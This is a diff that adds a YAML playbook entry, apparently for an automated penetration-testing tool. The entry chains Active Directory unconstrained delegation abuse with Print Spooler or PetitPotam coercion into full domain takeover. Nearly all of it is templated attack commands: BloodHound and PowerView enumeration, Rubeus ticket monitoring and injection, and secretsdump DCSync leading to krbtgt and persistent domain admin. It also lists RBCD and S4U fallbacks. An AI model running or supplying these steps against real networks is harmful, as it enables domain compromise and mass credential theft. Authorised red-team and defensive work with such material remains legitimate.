@@ -1,0 +1,43 @@
+id: ad_unconstrained_delegation
+title: "AD — Unconstrained delegation + printer-bug coercion → DA"
+phase: lateral
+mitre: ["T1558.003", "T1187"]
+trigger:
+  services: ["kerberos", "ldap", "smb"]
+  ports:    [88, 389, 445]
+  os_any:   ["windows server"]
+  technologies: ["active directory"]
+keywords: ["unconstrained delegation", "printer bug", "spoolsample", "tgt forwarding", "pretty printer bug"]
+preconditions:
+  - "Local admin on a host trusted for unconstrained delegation"
+  - "Print Spooler service running on a Domain Controller"
+steps:
+  - tool: bloodhound
+    cmd:  "bloodhound-python -d {domain} -u {user} -p {password} -ns {dc_ip} -c All --zip"
+    why:  "Identify hosts with TrustedForDelegation flag — Cypher: MATCH (c:Computer {unconstraineddelegation: true}) RETURN c"
+  - tool: powerview
+    cmd:  "powershell -c \"Get-DomainComputer -Unconstrained | select samaccountname,operatingsystem\""
+    why:  "PowerView equivalent — enum from a domain-joined attacker host"
+  - tool: rubeus
+    cmd:  "Rubeus.exe monitor /interval:1 /filteruser:{dc_hostname}$ /nowrap"
+    why:  "Monitor LSASS for incoming TGTs on the unconstrained-delegation host"
+  - tool: spoolsample
+    cmd:  "SpoolSample.exe {dc_hostname} {unconstrained_host}"
+    why:  "Coerce Print Spooler on DC to authenticate to attacker host (TGT lands in LSASS)"
+  - tool: petitpotam
+    cmd:  "PetitPotam.py -u {user} -p {password} -d {domain} {unconstrained_host} {dc_ip}"
+    why:  "MS-EFSRPC coercion fallback when Print Spooler patched"
+  - tool: rubeus
+    cmd:  "Rubeus.exe ptt /ticket:{captured_dc_tgt_b64}"
+    why:  "Inject the captured DC$ TGT into current session"
+  - tool: secretsdump
+    cmd:  "secretsdump.py -k -no-pass {dc_fqdn}"
+    why:  "Use the DC TGT to DCSync — game over"
+expected_outcome: "DC machine TGT captured → DCSync → krbtgt → forever-domain-admin"
+fallbacks:
+  - "Constrained delegation with protocol transition → S4U2self/S4U2proxy abuse (Rubeus s4u)"
+  - "Resource-Based Constrained Delegation (RBCD) — write to msDS-AllowedToActOnBehalfOfOtherIdentity"
+  - "If you only have local admin on a non-DC unconstrained host → still works, lower-value but easier coercion target"
+references:
+  - "https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained"
+  - "https://github.com/leechristensen/SpoolSample"
